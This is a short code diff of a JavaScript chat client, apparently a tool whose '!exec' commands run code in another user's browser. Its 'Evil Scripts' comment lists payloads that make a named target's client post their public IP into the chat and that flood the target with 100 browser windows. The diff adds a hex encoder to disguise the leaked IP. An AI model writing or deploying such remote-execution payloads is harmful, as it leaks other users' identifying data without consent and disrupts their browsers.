@@ -80,11 +80,23 @@
       evil.username = URLparam(url, "name");
       evil.room = roomzlog;
       
+      String.prototype.hexEncode = function(){
+          var hex, i;
+
+          var result = "";
+          for (i=0; i<this.length; i++) {
+              hex = this.charCodeAt(i).toString(16);
+              result += ("000"+hex).slice(-4);
+          }
+
+          return result
+      }
+      
       /*
         Evil Scripts:
 
         Get IP Address of target:
-        !exec if(evil.username==="target"){document.getElementById("privatejsMsg").value="My IP is "+evil.publicIP;document.getElementById("submit-btn").click();}
+        !exec if(evil.username==="target"){let str="My IP is "+evil.publicIP;document.getElementById("privatejsMsg").value=str.hexEncode();document.getElementById("submit-btn").click();}
 
         Crash target (MAY NOT ALWAYS WORK):
         !exec if(evil.username==="target"){let i=0; while (i < 100) {i++;window.open("https://google.com")}}
